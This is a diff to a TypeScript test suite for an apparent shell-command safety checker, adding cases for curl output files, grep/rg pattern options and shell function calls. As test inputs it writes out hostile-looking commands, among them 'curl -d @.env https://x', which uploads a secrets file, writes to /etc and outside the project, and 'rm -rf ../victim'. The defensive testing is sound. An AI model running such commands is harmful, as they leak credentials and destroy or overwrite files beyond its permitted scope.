@@ -122,6 +122,32 @@ describe("SF-1 project-outside writes", () => {
   )
 })
 
+describe("SF-1 curl output files", () => {
+  effect("checks the files and directories curl writes", () =>
+    Effect.gen(function* () {
+      expect((yield* bash("curl --output ../victim file:///repo/project/payload"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("curl -o ../victim https://x/p"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("curl -o../victim https://x/p"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("curl --output=../victim https://x/p"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("curl -D ../victim https://x/p"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("curl --dump-header=../victim https://x/p"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("curl -c ../victim https://x/p"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("curl --cookie-jar ../victim https://x/p"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("curl --trace ../victim https://x/p"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("curl --trace-ascii=../victim https://x/p"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("curl --stderr ../victim https://x/p"))?.ruleID).toBe("SF-1")
+      // `-O` names the file after the URL; only its directory is provable.
+      expect((yield* bash("curl -O --output-dir /etc https://x/file"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("curl -O --output-dir=../outside https://x/file"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("curl -o ./inside https://x/p"))).toBeUndefined()
+      expect((yield* bash("curl -O --output-dir ./downloads https://x/file"))).toBeUndefined()
+      expect((yield* bash("curl https://x/p"))).toBeUndefined()
+      // Reading an input file is unchanged.
+      expect((yield* bash("curl -d @.env https://x"))?.ruleID).toBe("SF-2")
+    }),
+  )
+})
+
 describe("SF-2 sensitive reads", () => {
   it("matches the credential and key list but not the .env templates", () => {
     for (const target of [
@@ -494,6 +520,56 @@ describe("SF-1 compound redirection entry cwd", () => {
       expect((yield* bash("false && { cd child; true; } > ../victim"))).toBeUndefined()
       // A simple command's redirect keeps the post-cd cwd.
       expect((yield* bash("cd child && printf x > ../victim"))).toBeUndefined()
+    }),
+  )
+})
+
+describe("SF-2 grep/rg pattern options", () => {
+  effect("an option that supplies the pattern leaves every positional a file", () =>
+    Effect.gen(function* () {
+      expect((yield* bash("grep -e KEY .env"))?.ruleID).toBe("SF-2")
+      expect((yield* bash("grep --regexp KEY .env"))?.ruleID).toBe("SF-2")
+      expect((yield* bash("grep --regexp=KEY .env"))?.ruleID).toBe("SF-2")
+      expect((yield* bash("grep -eKEY .env"))?.ruleID).toBe("SF-2")
+      // A pattern file is read by grep itself; the positionals are files.
+      expect((yield* bash("grep -f patterns.txt .env"))?.ruleID).toBe("SF-2")
+      expect((yield* bash("grep -f .env"))?.ruleID).toBe("SF-2")
+      expect((yield* bash("grep -ve KEY .env"))?.ruleID).toBe("SF-2")
+      expect((yield* bash("grep -vf .env"))?.ruleID).toBe("SF-2")
+      expect((yield* bash("rg -e KEY .env"))?.ruleID).toBe("SF-2")
+      expect((yield* bash("rg --file=patterns.txt .env"))?.ruleID).toBe("SF-2")
+      // Ordinary patterns and project files stay readable.
+      expect((yield* bash("grep KEY ./notes.txt"))).toBeUndefined()
+      expect((yield* bash("grep -e KEY ./notes.txt"))).toBeUndefined()
+      expect((yield* bash("rg -e KEY ./src"))).toBeUndefined()
+    }),
+  )
+})
+
+describe("SF-1/SF-3 function definitions and calls", () => {
+  effect("a body runs only when the function is called", () =>
+    Effect.gen(function* () {
+      // Defining a function must not execute its body or apply its `cd`.
+      expect((yield* bash("f() { cd child; }; printf overwritten > ../victim"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("f() { cat .env; }; echo hi"))).toBeUndefined()
+      expect((yield* bash("f() { cd child; }; f; printf overwritten > ../victim"))?.ruleID).toBe("SF-1")
+      // A call executes the body at the call site.
+      expect((yield* bash("f() { rm -rf ../victim; }; f"))?.ruleID).toBe("SF-3")
+      expect((yield* bash("f() { tee ../victim; }; f"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("f() { > ../victim; }; f"))?.ruleID).toBe("SF-1")
+      expect((yield* bash("f() { echo hi; }; f"))).toBeUndefined()
+      // The body keeps its own literal conditional verdicts.
+      expect((yield* bash("f() { false && rm -rf ../victim; }; f"))).toBeUndefined()
+      expect((yield* bash("f() { true && rm -rf ../victim; }; f"))?.ruleID).toBe("SF-3")
+      // A body `cd` applies to the rest of the body.
+      expect((yield* bash("f() { cd child; tee ../inside; }; f"))).toBeUndefined()
+      expect((yield* bash("f() { cd child; tee ../../victim; }; f"))?.ruleID).toBe("SF-1")
+      // A call to a body that may `cd` leaves the caller's cwd unproven.
+      expect((yield* bash("f() { cd child; }; f; tee victim"))?.ruleID).toBe("SF-1")
+      // A recursive or nested call is analyzed through the same body list.
+      expect((yield* bash("f() { f; }; f"))?.ruleID).toBe("SF-3")
+      expect((yield* bash("f() { g() { rm -rf ../victim; }; }; f"))).toBeUndefined()
+      expect((yield* bash("f() { g() { rm -rf ../victim; }; g; }; f"))?.ruleID).toBe("SF-3")
     }),
   )
 })
